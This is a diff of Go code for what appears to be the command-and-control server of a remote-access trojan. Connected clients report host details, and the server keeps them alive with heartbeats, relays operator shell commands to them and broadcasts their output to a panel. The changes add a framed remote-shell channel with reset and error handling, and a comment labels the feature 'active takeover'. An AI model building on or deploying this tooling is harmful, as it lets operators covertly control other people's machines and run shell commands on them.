@@ -12,10 +12,13 @@ import (
 )
 
 const SERVER_HEARTS = 0
+const SERVER_RESET = 1
 const SERVER_SHELL = 2
+const SERVER_SHELL_CHANNEL = 3
 const SERVER_DOWNLOAD = 4
 const SERVER_OPENURL = 8
 const SERVER_SYSTEMINFO = 10
+const SERVER_SHELL_ERROR = 12
 
 type CMSG struct {
 	sign  [10]byte
@@ -47,6 +50,9 @@ func listen(port string) {
 
 // 心跳包线程池和解决首次接入
 func doServerStuff(conn net.Conn) {
+	defer func() {
+		fmt.Println(conn.RemoteAddr().String(),"awsl!")
+	}()
 	for {
 
 		if _, ok := serverMap[conn]; !ok {
@@ -57,8 +63,8 @@ func doServerStuff(conn net.Conn) {
 				fmt.Println("Error reading Code:", l, err.Error())
 				return
 			}
-			var msg *CMSG = *(**CMSG)(unsafe.Pointer(&buf))
-			//fmt.Printf("Recv:\n\tMSG: %s \n\tMOD: %d \n\tLONG: %d \n", msg.sign, msg.mod, msg.msg_l)
+			var msg = *(**CMSG)(unsafe.Pointer(&buf))
+			fmt.Printf("Recv:\n\tMSG: %s \n\tMOD: %d \n\tLONG: %d \n", msg.sign, msg.mod, msg.msg_l)
 			if string(msg.sign[:]) == "customize\x00" {
 				if msg.msg_l != 0 && msg.mod == SERVER_SYSTEMINFO { // 是第一次登陆带有系统信息的包
 					buf := make([]byte, msg.msg_l)
@@ -96,14 +102,14 @@ func doServerStuff(conn net.Conn) {
 							shellInChan: make(chan string),
 						}
 						serverMap[conn] = &newS
-
 					}
 					onlineMsg := fmt.Sprintf("add|%s|%s|%s|%s|%s", serverMap[conn].uuid, serverMap[conn].intIp, serverMap[conn].ip, serverMap[conn].memory, serverMap[conn].OS)
 					Broadcast(onlineMsg)
 
 				}
+				Handle(conn, SERVER_HEARTS)
 			}
-			Handle(conn, SERVER_HEARTS)
+
 		} else {
 			s := serverMap[conn]
 			if s.status == SERVER_HEARTS {
@@ -118,7 +124,7 @@ func doServerStuff(conn net.Conn) {
 
 					return
 				}
-				var msg *CMSG = *(**CMSG)(unsafe.Pointer(&buf))
+				var msg = *(**CMSG)(unsafe.Pointer(&buf))
 				switch msg.mod {
 				case SERVER_HEARTS:
 
@@ -127,25 +133,13 @@ func doServerStuff(conn net.Conn) {
 				}
 
 			} else {
-				//其他操作中，暂时停止
 				time.Sleep(10 * time.Second)
 			}
 		}
 
 	}
 }
-func tlClearConn(conn net.Conn) {
-	switch serverMap[conn].status {
-	case SERVER_SHELL:
-		// 目前只有这个需要处理
-		_, err := conn.Write([]byte("reset"))
-		if err != nil {
-			_ = conn.Close()
-			delete(serverMap, conn)
-		}
 
-	}
-}
 func tlLoadMsg(code int, l int) CMSG {
 	var lSign [10]byte
 	bSign := []byte(sign)
@@ -168,39 +162,72 @@ func tlShellHandle(conn net.Conn) {
 	s := serverMap[conn]
 	go func() {
 		for {
-			shell, _ := <-s.shellInChan
-
-			l, err := conn.Write([]byte(shell+"\x00"))
+			buf := make([]byte, unsafe.Sizeof(CMSG{}))
+			l, err := conn.Read(buf)
+			fmt.Println(buf[:], string(buf))
+			var h = *(**CMSG)(unsafe.Pointer(&buf))
 			if err != nil || l == 0 {
-				fmt.Println("Send Error", err.Error())
 				s.status = SERVER_HEARTS
 				return
 			}
-			if shell == "reset" {
+			switch h.mod {
+			case SERVER_SHELL_CHANNEL:
+				shell := make([]byte, h.msg_l)
+				l, err := conn.Read(shell)
+				if err != nil || l == 0 {
+					s.status = SERVER_HEARTS
+					return
+				}
+				msg := fmt.Sprintf("out|%s|%s", s.uuid, shell)
+				dec := mahonia.NewDecoder("GBK")
+				Broadcast(dec.ConvertString(msg))
+			case SERVER_SHELL_ERROR:
 				s.status = SERVER_HEARTS
+				Handle(conn,SERVER_HEARTS)
+				return
+			case SERVER_RESET:
+				s.status = SERVER_HEARTS
+				Handle(conn,SERVER_HEARTS)
 				return
 			}
-
 		}
 	}()
 	for {
-		buf := make([]byte, 1024)
-		l, err := conn.Read(buf)
-		fmt.Println(buf[:])
+		if s.status != SERVER_SHELL {
+
+			return
+		}
+		shell, _ := <-s.shellInChan
+		if shell == "reset\n" {
+			msg := tlLoadMsg(SERVER_RESET, 0)
+			bMsg, _ := cstruct.Marshal(&msg)
+			l, err := conn.Write(bMsg)
+			if err != nil || l == 0 {
+				fmt.Println("Send Head Error", err.Error())
+				s.status = SERVER_HEARTS
+				return
+			}
+			fmt.Println("Shell Handle exit.")
+			return
+		}
+		msg := tlLoadMsg(SERVER_SHELL_CHANNEL, len(shell))
+		bMsg, _ := cstruct.Marshal(&msg)
+		l, err := conn.Write(bMsg)
 		if err != nil || l == 0 {
+			fmt.Println("Send Head Error", err.Error())
 			s.status = SERVER_HEARTS
 			return
 		}
-		if string(buf[:]) == "reset" {
+		l, err = conn.Write([]byte(shell))
+		fmt.Println("send:", shell)
+		if err != nil || l == 0 {
+			fmt.Println("Send Error", err.Error())
 			s.status = SERVER_HEARTS
 			return
 		}
-		msg := fmt.Sprintf("out|%s|%s", s.uuid, string(buf[:]))
-		dec:= mahonia.NewDecoder("GBK")
 
-
-		Broadcast(dec.ConvertString(msg))
 	}
+
 }
 
 // 主动接管
@@ -230,6 +257,15 @@ func Handle(conn net.Conn, code int) {
 			return
 		}
 		go tlShellHandle(conn)
+		//go func() {
+		//	for{
+		//		inputReader := bufio.NewReader(os.Stdin)
+		//		input, _ := inputReader.ReadString('\n')
+		//		//msg := tlLoadMsg(SERVER_SHELL_CHANNEL,len(input))
+		//		//bMsg, _ := cstruct.Marshal(&msg)
+		//		s.shellInChan<-input
+		//	}
+		//}()
 
 	}
 }
